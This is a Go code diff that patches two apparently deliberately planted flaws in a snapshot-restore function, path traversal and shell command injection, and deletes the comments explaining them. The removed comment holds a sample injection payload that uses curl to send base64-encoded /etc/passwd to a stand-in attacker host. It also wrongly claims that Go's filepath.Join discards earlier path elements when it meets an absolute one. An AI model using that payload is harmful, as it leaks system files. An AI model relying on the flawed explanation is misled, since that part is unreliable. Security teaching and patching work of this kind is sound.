@@ -42,39 +42,19 @@ func GetSnapshot(snapshotID string) (*Snapshot, error) {
 
 // ── Restore execution ─────────────────────────────────────────────────────
 
-/*
-RestoreSnapshot decompresses a snapshot archive into destDir.
-
-VULN-8 (Path traversal via filepath.Join absolute-path override):
-filepath.Join silently discards all preceding elements when it encounters
-an absolute path component.  If destDir is attacker-controlled and is an
-absolute path (e.g. "/etc"), filepath.Join(backupStorageRoot, "/etc")
-returns "/etc", completely bypassing the intended storage root confinement.
-The fix is to validate that the resolved path still has backupStorageRoot
-as a prefix after Join.
-
-VULN-9 (Command injection via sh -c with unsanitised environment value):
-COMPRESS_TOOL is read from the process environment and embedded verbatim
-into a shell command string passed to "sh -c".  An operator—or an attacker
-who can set environment variables (e.g. via a misconfigured orchestrator
-secret)—can inject shell metacharacters:
-  COMPRESS_TOOL="gzip; curl http://attacker/$(cat /etc/passwd | base64)"
-exec.Command should be invoked directly with split arguments, bypassing
-the shell entirely.
-*/
+// RestoreSnapshot decompresses a snapshot archive into destDir.
 func RestoreSnapshot(snap *Snapshot, destDir string) error {
-	// filepath.Join with a caller-supplied absolute destDir silently ignores
-	// backupStorageRoot and resolves to destDir alone.
 	outputPath := filepath.Join(backupStorageRoot, destDir, snap.Path)
+	if !strings.HasPrefix(outputPath, backupStorageRoot+string(filepath.Separator)) {
+		return fmt.Errorf("invalid destination path")
+	}
 
 	compressTool := os.Getenv("COMPRESS_TOOL")
 	if compressTool == "" {
 		compressTool = "gzip"
 	}
 
-	// Shell injection: compressTool value is concatenated without escaping.
-	shellCmd := compressTool + " -d " + outputPath
-	cmd := exec.Command("sh", "-c", shellCmd)
+	cmd := exec.Command(compressTool, "-d", outputPath)
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
 	return cmd.Run()
